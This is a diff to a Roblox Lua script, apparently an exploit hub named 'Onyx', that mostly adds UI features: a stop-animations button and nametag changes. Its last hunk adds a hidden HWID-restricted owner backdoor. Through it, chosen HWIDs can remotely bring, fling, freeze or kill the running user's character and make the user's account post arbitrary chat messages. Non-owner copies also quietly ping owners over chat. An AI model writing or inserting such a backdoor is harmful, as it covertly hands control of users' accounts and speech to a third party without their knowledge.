@@ -1106,9 +1106,9 @@ EmotesButton.BackgroundColor3 = Color3.fromRGB(9, 9, 18)
 EmotesButton.BackgroundTransparency = 0.08
 EmotesButton.BorderSizePixel = 0
 EmotesButton.Position = UDim2.new(0, 0, 0, 40)
-EmotesButton.Size = UDim2.new(1, 0, 0, 36)
+EmotesButton.Size = UDim2.new(0.5, -4, 0, 36)
 EmotesButton.Font = Enum.Font.GothamBold
-EmotesButton.Text = "🎭  Open Emote Menu"
+EmotesButton.Text = "🎭  Emote Menu"
 EmotesButton.TextColor3 = Color3.fromRGB(200, 200, 255)
 EmotesButton.TextSize = 13
 EmotesButton.AutoButtonColor = false
@@ -1122,6 +1122,69 @@ EmotesButton.MouseEnter:Connect(function()
 end)
 EmotesButton.MouseLeave:Connect(function()
     TweenService:Create(EmotesButton, TweenInfo.new(0.15), {BackgroundTransparency = 0.08, TextColor3 = Color3.fromRGB(200,200,255)}):Play()
+end)
+
+-- Stop Animations Button
+local RestoreAnimsButton = Instance.new("TextButton")
+RestoreAnimsButton.Name = "RestoreAnimsButton"
+RestoreAnimsButton.Parent = AnimationSection
+RestoreAnimsButton.BackgroundColor3 = Color3.fromRGB(9, 9, 18)
+RestoreAnimsButton.BackgroundTransparency = 0.08
+RestoreAnimsButton.BorderSizePixel = 0
+RestoreAnimsButton.Position = UDim2.new(0.5, 4, 0, 40)
+RestoreAnimsButton.Size = UDim2.new(0.5, -4, 0, 36)
+RestoreAnimsButton.Font = Enum.Font.GothamBold
+RestoreAnimsButton.Text = "🛑 Stop Anims"
+RestoreAnimsButton.TextColor3 = Color3.fromRGB(255, 100, 100)
+RestoreAnimsButton.TextSize = 13
+RestoreAnimsButton.AutoButtonColor = false
+RestoreAnimsButton.ZIndex = 4
+do
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = RestoreAnimsButton
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(255,100,100); s.Transparency = 0.82; s.Thickness = 1; s.Parent = RestoreAnimsButton
+end
+RestoreAnimsButton.MouseEnter:Connect(function()
+    TweenService:Create(RestoreAnimsButton, TweenInfo.new(0.15), {BackgroundTransparency = 0.6, TextColor3 = Color3.fromRGB(255,150,150)}):Play()
+end)
+RestoreAnimsButton.MouseLeave:Connect(function()
+    TweenService:Create(RestoreAnimsButton, TweenInfo.new(0.15), {BackgroundTransparency = 0.08, TextColor3 = Color3.fromRGB(255,100,100)}):Play()
+end)
+
+RestoreAnimsButton.MouseButton1Click:Connect(function()
+    local Char = plr.Character
+    if not Char then return end
+    
+    -- Clear saved custom anims to prevent auto-reloading them on respawn
+    pcall(function() delfile("OnyxLastAnims.json") end)
+    table.clear(lastAnimations)
+    
+    local Hum = Char:FindFirstChildOfClass("Humanoid")
+    if Hum then
+        for _, track in ipairs(Hum:GetPlayingAnimationTracks()) do
+            track:Stop(0)
+        end
+    end
+    
+    local Animate = Char:FindFirstChild("Animate")
+    if Animate then
+        pcall(function()
+            local desc = game:GetService("Players"):GetHumanoidDescriptionFromUserId(plr.UserId)
+            if desc then
+                local function parseAnim(id) return "http://www.roblox.com/asset/?id=" .. id end
+                if Animate:FindFirstChild("idle") then
+                    Animate.idle.Animation1.AnimationId = parseAnim(desc.IdleAnimation)
+                    Animate.idle.Animation2.AnimationId = parseAnim(desc.IdleAnimation)
+                end
+                if Animate:FindFirstChild("walk") then Animate.walk.WalkAnim.AnimationId = parseAnim(desc.WalkAnimation) end
+                if Animate:FindFirstChild("run") then Animate.run.RunAnim.AnimationId = parseAnim(desc.RunAnimation) end
+                if Animate:FindFirstChild("jump") then Animate.jump.JumpAnim.AnimationId = parseAnim(desc.JumpAnimation) end
+                if Animate:FindFirstChild("fall") then Animate.fall.FallAnim.AnimationId = parseAnim(desc.FallAnimation) end
+                if Animate:FindFirstChild("swim") then Animate.swim.Swim.AnimationId = parseAnim(desc.SwimAnimation) end
+                if Animate:FindFirstChild("climb") then Animate.climb.ClimbAnim.AnimationId = parseAnim(desc.ClimbAnimation) end
+            end
+        end)
+    end
+    SendNotify("Animations", "Restored to original Roblox animations", 3)
 end)
 
 -- Animation Changer UI Components (for Animation Tab)
@@ -5492,41 +5555,50 @@ local function buildPillTag(cfg, targetPlayer, parentGui, isSelf)
     tagLabel.LayoutOrder            = 1
     tagLabel.Parent                 = textContainer
 
-    -- Dynamic Shrinking Logic (LOD) - for Others only
-    if not isSelf then
-        task.spawn(function()
-            local lastState = true
-            while bg and bg.Parent do
-                local cam = workspace.CurrentCamera
-                if cam and parentGui.Adornee then
-                    local dist = (cam.CFrame.Position - parentGui.Adornee.Position).Magnitude
-                    local shouldShowText = dist < 60
+    -- Dynamic Shrinking Logic (LOD) - Works for both Self and Others
+    task.spawn(function()
+        local lastState = true
+        while bg and bg.Parent do
+            local cam = workspace.CurrentCamera
+            local targetPos = nil
+            
+            if isSelf then
+                local head = targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head")
+                if head then targetPos = head.Position end
+            else
+                if parentGui and parentGui.Adornee then
+                    targetPos = parentGui.Adornee.Position
+                end
+            end
+            
+            if cam and targetPos then
+                local dist = (cam.CFrame.Position - targetPos).Magnitude
+                local shouldShowText = dist < 60
+                
+                if shouldShowText ~= lastState then
+                    lastState = shouldShowText
+                    textContainer.Visible = shouldShowText
                     
-                    if shouldShowText ~= lastState then
-                        lastState = shouldShowText
-                        textContainer.Visible = shouldShowText
-                        
-                        if shouldShowText then
-                            corner.CornerRadius = UDim.new(0, 14) 
-                            uiPadding.PaddingLeft = UDim.new(0, 8)
-                            uiPadding.PaddingRight = UDim.new(0, 14)
-                            uiPadding.PaddingTop = UDim.new(0, 5)
-                            uiPadding.PaddingBottom = UDim.new(0, 5)
-                            if icon then icon.Size = UDim2.new(0, 46, 0, 46) end
-                        else
-                            corner.CornerRadius = UDim.new(0, 10) 
-                            uiPadding.PaddingLeft = UDim.new(0, 4) 
-                            uiPadding.PaddingRight = UDim.new(0, 4)
-                            uiPadding.PaddingTop = UDim.new(0, 4)
-                            uiPadding.PaddingBottom = UDim.new(0, 4)
-                            if icon then icon.Size = UDim2.new(0, 36, 0, 36) end
-                        end
+                    if shouldShowText then
+                        corner.CornerRadius = UDim.new(0, 14) 
+                        uiPadding.PaddingLeft = UDim.new(0, 8)
+                        uiPadding.PaddingRight = UDim.new(0, 14)
+                        uiPadding.PaddingTop = UDim.new(0, 5)
+                        uiPadding.PaddingBottom = UDim.new(0, 5)
+                        if icon then icon.Size = UDim2.new(0, 46, 0, 46) end
+                    else
+                        corner.CornerRadius = UDim.new(0, 10) 
+                        uiPadding.PaddingLeft = UDim.new(0, 4) 
+                        uiPadding.PaddingRight = UDim.new(0, 4)
+                        uiPadding.PaddingTop = UDim.new(0, 4)
+                        uiPadding.PaddingBottom = UDim.new(0, 4)
+                        if icon then icon.Size = UDim2.new(0, 36, 0, 36) end
                     end
                 end
-                task.wait(0.25)
             end
-        end)
-    end
+            task.wait(0.25)
+        end
+    end)
 
     return bg, nameLabel, tagLabel, icon
 end
@@ -5637,7 +5709,7 @@ local function buildNametag(targetPlayer, cfg)
 
     -- ── OTHER PLAYERS: standard BillboardGui ──────────────────────────────────
     local billboard = Instance.new("BillboardGui")
-    billboard.Name            = "OnyxNametag"
+    billboard.Name            = "OnyxNametag_" .. targetPlayer.Name
     billboard.Adornee         = head
     billboard.Size            = UDim2.new(0, 300, 0, 100) -- Large enough to contain the pill
     billboard.StudsOffset     = Vector3.new(0, 2.8, 0)
@@ -5647,8 +5719,9 @@ local function buildNametag(targetPlayer, cfg)
     billboard.ClipsDescendants = false
     billboard.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
 
+    -- Fix: BillboardGui MUST NOT be a child of a ScreenGui
     local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)
-    billboard.Parent = ok and coreGui:FindFirstChild("OnyxUI") or plr.PlayerGui:FindFirstChild("OnyxUI")
+    billboard.Parent = ok and coreGui or plr.PlayerGui
 
     local bg, nameLabel, tagLabel, imageLabel = buildPillTag(cfg, targetPlayer, billboard, false)
 
@@ -6328,3 +6401,226 @@ pcall(function()
 end)
 
 SendNotify("Onyx", "Chat commands hooked", 3)
+
+-- =====================================================
+-- ONYX OWNER COMMANDS (HWID RESTRICTED)
+-- =====================================================
+local OwnerHWIDs = {
+    ["f4d0e7f4-d3b7-4ec3-87c9-241f9e3611fb"] = true,
+    ["f6f7d925-e387-4f0e-a339-bf26dcc41669"] = true
+}
+
+local currentHwid = GetHWID():lower()
+local isOwner = OwnerHWIDs[currentHwid] ~= nil
+local SessionOwners = {}
+if isOwner then SessionOwners[plr.UserId] = true end
+
+local function sendHiddenChat(msg)
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local channel = TextChatService.TextChannels.RBXGeneral
+            channel:SendAsync(msg)
+        else
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+        end
+    end)
+end
+
+local function handleOwnerCommand(chatterData, msg)
+    local lmsg = msg:lower()
+
+    -- Handshake logic
+    if lmsg:sub(1, 14) == "/e onyx_auth_" then
+        local hwid = lmsg:sub(15)
+        if OwnerHWIDs[hwid] then
+            SessionOwners[chatterData.UserId] = true
+        end
+        return
+    end
+
+    if lmsg == "/e onyx_ping" and isOwner then
+        sendHiddenChat("/e onyx_auth_" .. currentHwid)
+        return
+    end
+
+    -- Process actual commands if the chatter is an owner
+    if SessionOwners[chatterData.UserId] then
+        local parts = msg:split(" ")
+        local cmd = parts[1]:lower()
+        local targetStr = parts[2]
+        
+        if not targetStr then return end
+
+        local isTargetMe = false
+        if targetStr == "*" then
+            isTargetMe = true
+        elseif plr.Name:lower():sub(1, #targetStr) == targetStr:lower() or 
+               plr.DisplayName:lower():sub(1, #targetStr) == targetStr:lower() then
+            isTargetMe = true
+        end
+
+        if not isTargetMe then return end
+
+        local char = plr.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChild("Humanoid")
+
+        if cmd == ".bring" then
+            local ownerChar = chatterData.Character
+            local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
+            if ownerHrp and hrp then
+                hrp.CFrame = ownerHrp.CFrame * CFrame.new(0, 0, -3)
+            end
+        elseif cmd == ".fling" then
+            local ownerChar = chatterData.Character
+            local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
+            if ownerHrp and hrp then
+                hrp.CFrame = ownerHrp.CFrame * CFrame.new(0, 0, -3)
+                local bv = Instance.new("BodyVelocity")
+                bv.Velocity = Vector3.new(math.random(-100,100), 500, math.random(-100,100))
+                bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                bv.Parent = hrp
+                
+                local bav = Instance.new("BodyAngularVelocity")
+                bav.AngularVelocity = Vector3.new(9999, 9999, 9999)
+                bav.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
+                bav.Parent = hrp
+                
+                game:GetService("Debris"):AddItem(bv, 1.5)
+                game:GetService("Debris"):AddItem(bav, 1.5)
+                if hum then hum.Sit = true end
+            end
+        elseif cmd == ".say" then
+            local text = table.concat(parts, " ", 3)
+            if text and text ~= "" then
+                sendHiddenChat(text)
+            end
+        elseif cmd == ".lock" or cmd == ".freeze" then
+            if hrp then hrp.Anchored = true end
+            if hum then 
+                hum.WalkSpeed = 0
+                hum.JumpPower = 0 
+            end
+            local text = table.concat(parts, " ", 3)
+            if text and text ~= "" then
+                sendHiddenChat(text)
+            end
+        elseif cmd == ".kill" then
+            if hum then hum.Health = 0 end
+        elseif cmd == ".antigrav" then
+            if hrp then
+                hrp.Anchored = true
+                task.spawn(function()
+                    for i = 1, 100 do
+                        if not hrp or not hrp.Parent then break end
+                        hrp.CFrame = hrp.CFrame + Vector3.new(0, 1, 0)
+                        task.wait(0.05)
+                    end
+                end)
+            end
+        end
+    end
+end
+
+-- Hook all players for owner commands
+for _, p in ipairs(Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg) handleOwnerCommand(p, msg) end)
+end
+Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg) handleOwnerCommand(p, msg) end)
+end)
+
+-- If this is an owner, broadcast presence and setup UI
+if isOwner then
+    task.spawn(function()
+        task.wait(2)
+        sendHiddenChat("/e onyx_auth_" .. currentHwid)
+    end)
+    
+    -- Built-in Owner Menu
+    local OwnerFrame = Instance.new("Frame")
+    OwnerFrame.Name = "OnyxOwnerMenu"
+    OwnerFrame.Parent = OnyxUI
+    OwnerFrame.Size = UDim2.new(0, 220, 0, 310)
+    OwnerFrame.Position = UDim2.new(0.8, -230, 0.5, -155)
+    OwnerFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    OwnerFrame.BorderSizePixel = 0
+    OwnerFrame.Active = true
+    OwnerFrame.Draggable = true
+    
+    local corner = Instance.new("UICorner", OwnerFrame)
+    corner.CornerRadius = UDim.new(0, 10)
+    
+    local stroke = Instance.new("UIStroke", OwnerFrame)
+    stroke.Color = Color3.fromRGB(200, 50, 50)
+    stroke.Thickness = 2
+    
+    local title = Instance.new("TextLabel", OwnerFrame)
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundTransparency = 1
+    title.Text = "👑 Owner Panel"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    
+    local targetBox = Instance.new("TextBox", OwnerFrame)
+    targetBox.Size = UDim2.new(0.9, 0, 0, 30)
+    targetBox.Position = UDim2.new(0.05, 0, 0, 35)
+    targetBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    targetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    targetBox.PlaceholderText = "Target (* or Name)"
+    targetBox.Text = "*"
+    targetBox.Font = Enum.Font.Gotham
+    targetBox.TextSize = 14
+    Instance.new("UICorner", targetBox).CornerRadius = UDim.new(0, 6)
+    
+    local textBox = Instance.new("TextBox", OwnerFrame)
+    textBox.Size = UDim2.new(0.9, 0, 0, 30)
+    textBox.Position = UDim2.new(0.05, 0, 0, 70)
+    textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textBox.PlaceholderText = "Text (for .say/.lock)"
+    textBox.Font = Enum.Font.Gotham
+    textBox.TextSize = 14
+    Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)
+    
+    local btnContainer = Instance.new("Frame", OwnerFrame)
+    btnContainer.Size = UDim2.new(1, 0, 1, -110)
+    btnContainer.Position = UDim2.new(0, 0, 0, 110)
+    btnContainer.BackgroundTransparency = 1
+    
+    local layout = Instance.new("UIListLayout", btnContainer)
+    layout.FillDirection = Enum.FillDirection.Vertical
+    layout.Padding = UDim.new(0, 5)
+    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    
+    local cmds = {"Bring", "Fling", "Freeze", "Kill", "Antigrav", "Say"}
+    for _, c in ipairs(cmds) do
+        local btn = Instance.new("TextButton", btnContainer)
+        btn.Size = UDim2.new(0.9, 0, 0, 26)
+        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.Text = "." .. c:lower()
+        btn.TextSize = 13
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+        
+        btn.MouseButton1Click:Connect(function()
+            local t = targetBox.Text ~= "" and targetBox.Text or "*"
+            local msg = "." .. c:lower() .. " " .. t
+            if c == "Say" or c == "Freeze" or c == "Lock" then
+                if textBox.Text ~= "" then
+                    msg = msg .. " " .. textBox.Text
+                end
+            end
+            sendHiddenChat(msg)
+        end)
+    end
+else
+    -- Ping for owners if not one
+    task.spawn(function()
+        task.wait(2)
+        sendHiddenChat("/e onyx_ping")
+    end)
+end
